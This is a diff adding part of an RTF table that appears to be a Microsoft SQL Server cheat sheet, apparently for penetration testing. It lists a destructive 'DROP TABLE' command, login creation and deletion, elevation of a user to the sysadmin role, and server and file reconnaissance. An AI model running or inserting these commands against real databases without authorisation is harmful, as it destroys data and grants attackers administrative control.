+DROP TABLE mydata;\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Hostname, IP Address\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT HOST_NAME()\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Create Users\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 EXEC {\field{\*\fldinst{HYPERLINK "http://msdn2.microsoft.com/en-us/library/ms173768.aspx"}}{\fldrslt \cf4 sp_addlogin}} \'91user\'92, \'91pass\'92; \'97 priv\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Drop Users\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 EXEC {\field{\*\fldinst{HYPERLINK "http://msdn2.microsoft.com/en-us/library/ms189767.aspx"}}{\fldrslt \cf4 sp_droplogin}} \'91user\'92; \'97 priv\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Make User DBA\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 EXEC {\field{\*\fldinst{HYPERLINK "http://msdn2.microsoft.com/en-us/library/ms186320.aspx"}}{\fldrslt \cf4 master.dbo.sp_addsrvrolemember}} \'91user\'92, \'91sysadmin; \'97 priv\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Location of DB files\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 EXEC sp_helpdb master; \'96location of master.mdf\
+EXEC sp_helpdb pubs; \'96location of pubs.mdf\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrt\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Default/System Databases\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 northwind\
+model\
+msdb\
+pubs \'97 not on sql server 2005\
+tempdb\cell \lastrow\row
+}
